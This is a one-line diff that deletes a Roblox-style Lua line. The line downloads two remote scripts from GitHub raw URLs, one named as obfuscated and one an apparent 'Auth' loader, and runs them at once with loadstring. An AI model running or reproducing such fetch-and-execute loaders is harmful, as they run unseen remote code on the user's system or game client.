@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/insomniascripts/lua/refs/heads/main/obfuscated_script-1792961868868.lua.txt", true))() task.wait(0.5) loadstring(game:HttpGet("https://raw.githubusercontent.com/InsomniaTrial/Insomnia/refs/heads/main/Auth"))()
